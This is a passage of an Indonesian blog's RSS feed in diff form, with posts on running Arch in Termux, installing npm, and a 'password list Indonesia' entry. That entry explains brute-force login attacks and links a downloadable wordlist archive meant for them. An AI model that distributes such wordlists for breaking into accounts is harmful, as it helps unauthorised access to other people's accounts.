+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;perintah-setelah-penginstalan&#34;&gt;perintah setelah penginstalan&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+
+pacman -S neofetch
+pacman -S fish
+
+
+Nano .bashrc
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Tempel kan script ini di line paling bawah.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -f /usr/bin/neofetch &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+        neofetch
+        fish
+&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 86; 
+			flex-basis: 206px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/pasang-arch-di-termux/Screenshot_2021_1009_110234.png&#34; data-size=&#34;719x834&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/pasang-arch-di-termux/Screenshot_2021_1009_110234.png&#34;
+			width=&#34;719&#34;
+			height=&#34;834&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/pasang-arch-di-termux/Screenshot_2021_1009_110234_hu8b3eab5cd20cb4107ef2c2f71455f2c4_91129_480x0_resize_box_3.png 480w, https://maidey.github.io/blog/blog/artikel/pasang-arch-di-termux/Screenshot_2021_1009_110234_hu8b3eab5cd20cb4107ef2c2f71455f2c4_91129_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;seperti ini&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;seperti ini&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ctrl+x&lt;/code&gt; &amp;raquo; &lt;code&gt;y&lt;/code&gt; &amp;raquo; &lt;code&gt;enter&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Keluar dan masuk lagi ke termux&lt;/p&gt;
+&lt;h3 id=&#34;perintah-dasar&#34;&gt;perintah dasar&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;
+
+pacman -Ss &amp;lt;nama tool&amp;gt; &lt;span style=&#34;color:#75715e&#34;&gt;#ini untuk mencari tool&lt;/span&gt;
+pacman -S &amp;lt;nama tool&amp;gt; &lt;span style=&#34;color:#75715e&#34;&gt;#ini untuk meng-install tool&lt;/span&gt;
+pacman -Syu &lt;span style=&#34;color:#75715e&#34;&gt;#ini untuk  meng-upgrade&lt;/span&gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>password list Indonesia</title>
+        <link>https://maidey.github.io/blog/artikel/password-list-indonesia/</link>
+        <pubDate>Fri, 08 Oct 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://maidey.github.io/blog/artikel/password-list-indonesia/</guid>
+        <description>&lt;img src="https://maidey.github.io/blog/artikel/password-list-indonesia/IMG_20211008_105449_828.jpg" alt="Featured image of post password list Indonesia" /&gt;&lt;h2 id=&#34;apa-itu-password-list&#34;&gt;Apa itu Password list&lt;/h2&gt;
+&lt;p&gt;password list adalah kumpulan Password yang biasanya digunakan untuk hacking tipe &lt;strong&gt;Brute Force.&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;apa-brute-force&#34;&gt;Apa Brute Force&lt;/h2&gt;
+&lt;p&gt;Brute Force adalah tehnik hacking menggunakan trial-and-error untuk menebak info login, kunci enkripsi, atau menemukan halaman web yang tersembunyi. Hacker bekerja melalui semua kemungkinan kombinasi berharap untuk menebak dengan benar.&lt;/p&gt;
+&lt;p&gt;Serangan ini dilakukan dengan &amp;lsquo;brute force&amp;rsquo; yang berarti mereka menggunakan upaya paksa yang berlebihan untuk mencoba dan &amp;lsquo;memaksa&amp;rsquo; masuk ke akun pribadi Anda.&lt;/p&gt;
+&lt;p&gt;Ini adalah metode serangan lama, tetapi masih efektif dan populer di kalangan peretas Karena tergantung pada panjang dan kerumitan kata sandi, pemecahannya dapat memakan waktu mulai dari beberapa detik hingga bertahun-tahun.&lt;/p&gt;
+&lt;h2 id=&#34;download-password-list&#34;&gt;download Password list&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Ukuran&lt;/th&gt;
+&lt;th&gt;download&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;50 MB &amp;gt; 4GB&lt;/td&gt;
+&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://drive.google.com/file/d/1FORnKBjfUvNH-QC3s9To7MH2Rst-rsih/view?usp=drivesdk&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://drive.google.com/file/d/1FORnKBjfUvNH-QC3s9To7MH2Rst-rsih/view?usp=drivesdk&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 100; 
+			flex-basis: 240px&#34;
+	&gt;
+	&lt;a href=&#34;https://maidey.github.io/blog/blog/artikel/password-list-indonesia/20211008_105209.jpg&#34; data-size=&#34;1280x1280&#34;&gt;
+		&lt;img src=&#34;https://maidey.github.io/blog/blog/artikel/password-list-indonesia/20211008_105209.jpg&#34;
+			width=&#34;1280&#34;
+			height=&#34;1280&#34;
+			srcset=&#34;https://maidey.github.io/blog/blog/artikel/password-list-indonesia/20211008_105209_hu0f81677ca53754b440b5703bcb9bd355_66708_480x0_resize_q75_box.jpg 480w, https://maidey.github.io/blog/blog/artikel/password-list-indonesia/20211008_105209_hu0f81677ca53754b440b5703bcb9bd355_66708_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;file Zip 50 MB &amp;gt; 4GB&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;file Zip 50 MB &amp;gt; 4GB&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>cara install npm di termux</title>
+        <link>https://maidey.github.io/blog/artikel/cara-install-npm-di-termux/</link>
+        <pubDate>Thu, 07 Oct 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://maidey.github.io/blog/artikel/cara-install-npm-di-termux/</guid>
+        <description>&lt;img src="https://maidey.github.io/blog/artikel/cara-install-npm-di-termux/20211007_205809.jpg" alt="Featured image of post cara install npm di termux" /&gt;&lt;h3 id=&#34;apa-itu-npm&#34;&gt;Apa itu npm&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;npm&lt;/strong&gt; adalah manajer package default untuk lingkungan runtime &lt;strong&gt;JavaScript Node.js&lt;/strong&gt;. Ini terdiri dari command line client, juga disebut &lt;strong&gt;npm&lt;/strong&gt;, dan database online package publik dan pribadi berbayar, yang disebut registri &lt;strong&gt;npm&lt;/strong&gt;. Registri diakses melalui klien, dan package yang tersedia dapat diakses dan dicari melalui situs web &lt;strong&gt;npm&lt;/strong&gt;. Manajer package dan registri dikelola oleh &lt;strong&gt;npm, Inc.&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;pendapat-saya&#34;&gt;Pendapat saya&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;npm&lt;/strong&gt; ini sangat penting, kenapa saya sebut &lt;strong&gt;npm&lt;/strong&gt; ini sangat penting? karena banyak sekali package yang tidak tersedia di &lt;strong&gt;PKG&lt;/strong&gt; tapi tersedia di &lt;strong&gt;npm&lt;/strong&gt; , contoh nya package &lt;strong&gt;VScode&lt;/strong&gt; tidak ada  di &lt;strong&gt;PKG&lt;/strong&gt; tapi ada di &lt;strong&gt;NPM&lt;/strong&gt; walau pun namanya berbeda. menurut data terbaru &lt;strong&gt;NPM&lt;/strong&gt; dipakai lebih dari &lt;strong&gt;&lt;span style=&#39;color:#ff0000;&#39;&gt;11 juta&lt;/span&gt;&lt;/strong&gt; pengguna di seluruh dunia.&lt;/p&gt;
+&lt;h3 id=&#34;ini-adalah-contoh-perintah-yang-ada-di-npm&#34;&gt;ini adalah contoh perintah yang ada di NPM&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;npm&lt;/strong&gt;
+Manajer paket JavaScript&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm access&lt;/strong&gt;
+Tetapkan tingkat akses pada paket yang diterbitkan&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm adduser&lt;/strong&gt;
+Tambahkan akun pengguna registri&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm audit&lt;/strong&gt;
+Jalankan audit keamanan&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm bin&lt;/strong&gt;
+Tampilkan folder npm bin&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm bugs&lt;/strong&gt;
+Bug untuk paket di browser web mungkin&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm cache&lt;/strong&gt;
+Memanipulasi cache paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm ci&lt;/strong&gt;
+Instal proyek dengan yang bersih&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm completion&lt;/strong&gt;
+Penyelesaian tab untuk npm&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm config&lt;/strong&gt;
+Kelola file konfigurasi npm&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm dedupe&lt;/strong&gt;
+Kurangi duplikasi&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm deprecate&lt;/strong&gt;
+Menghentikan versi paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm diff&lt;/strong&gt;
+Perintah diff registri&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm dist-tag&lt;/strong&gt;
+Ubah tag distribusi paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm docs&lt;/strong&gt;
+Dokumen untuk paket di browser web mungkin&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm doctor&lt;/strong&gt;
+Periksa lingkungan Anda&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm edit&lt;/strong&gt;
+Edit paket yang diinstal&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm exec&lt;/strong&gt;
+Jalankan perintah dari paket npm&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm explain&lt;/strong&gt;
+Jelaskan paket yang diinstal&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm explore&lt;/strong&gt;
+Jelajahi paket yang diinstal&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm find-dupes&lt;/strong&gt;
+Temukan duplikasi di pohon paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm fund&lt;/strong&gt;
+Ambil informasi pendanaan&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm help&lt;/strong&gt;
+Cari dokumentasi bantuan npm&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm help-search&lt;/strong&gt;
+Dapatkan bantuan di npm&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm hook&lt;/strong&gt;
+Kelola kait registri&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm init&lt;/strong&gt;
+Buat file package.json&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm install&lt;/strong&gt;
+Instal paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm install-ci-test&lt;/strong&gt;
+Instal proyek dengan yang bersih dan jalankan tes&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm install-test&lt;/strong&gt;
+Instal paket dan jalankan tes&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm link&lt;/strong&gt;
+Symlink folder paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm logout&lt;/strong&gt;
+Keluar dari registri&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm ls&lt;/strong&gt;
+Daftar paket yang diinstal&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm org&lt;/strong&gt;
+Kelola organisasi&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm outdated&lt;/strong&gt;
+Periksa paket usang&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm owner&lt;/strong&gt;
+Kelola pemilik paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm pack&lt;/strong&gt;
+Buat tarball dari paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm ping&lt;/strong&gt;
+Ping npm registri&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm pkg&lt;/strong&gt;
+Kelola package.json Anda&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm prefix&lt;/strong&gt;
+Tampilan awalan&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm profile&lt;/strong&gt;
+Ubah pengaturan pada profil registri Anda&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm prune&lt;/strong&gt;
+Hapus paket asing&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm publish&lt;/strong&gt;
+Publikasikan paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm rebuild&lt;/strong&gt;
+Membangun kembali paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm repo&lt;/strong&gt;
+Buka halaman repositori paket di browser&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm restart&lt;/strong&gt;
+Mulai ulang paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm root&lt;/strong&gt;
+Tampilkan npm root&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm run-script&lt;/strong&gt;
+Jalankan skrip paket arbitrer&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm search&lt;/strong&gt;
+Cari paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm set-script&lt;/strong&gt;
+Tetapkan tugas di bagian skrip package.json&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm shrinkwrap&lt;/strong&gt;
+Kunci versi ketergantungan untuk publikasi&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm star&lt;/strong&gt;
+Tandai paket favorit Anda&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm stars&lt;/strong&gt;
+Lihat paket yang ditandai sebagai favorit&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm start&lt;/strong&gt;
+Mulai paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm stop&lt;/strong&gt;
+Hentikan paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm team&lt;/strong&gt;
+Kelola tim organisasi dan keanggotaan tim&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm test&lt;/strong&gt;
+Uji paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm token&lt;/strong&gt;
+Kelola token autentikasi Anda&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm uninstall&lt;/strong&gt;
+Hapus paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm unpublish&lt;/strong&gt;
+Hapus paket dari registri&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm unstar&lt;/strong&gt;
+Hapus item dari paket favorit Anda&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm update&lt;/strong&gt;
+Perbarui paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm version&lt;/strong&gt;
+Bump versi paket&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm view&lt;/strong&gt;
+Lihat info pendaftaran&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npm whoami&lt;/strong&gt;
+Tampilkan nama pengguna npm&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;npx&lt;/strong&gt;
+Jalankan perintah dari paket npm&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;menginstal&#34;&gt;menginstal&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;$ apt update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt upgrade
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#ini npm&lt;/span&gt;
+$ pkg i nodejs 
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#untuk menjalankan&lt;/span&gt;
+$ npm install ....
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Kunjungi juga website resmi npm
+&lt;a class=&#34;link&#34; href=&#34;https://www.npmjs.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.npmjs.com/&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
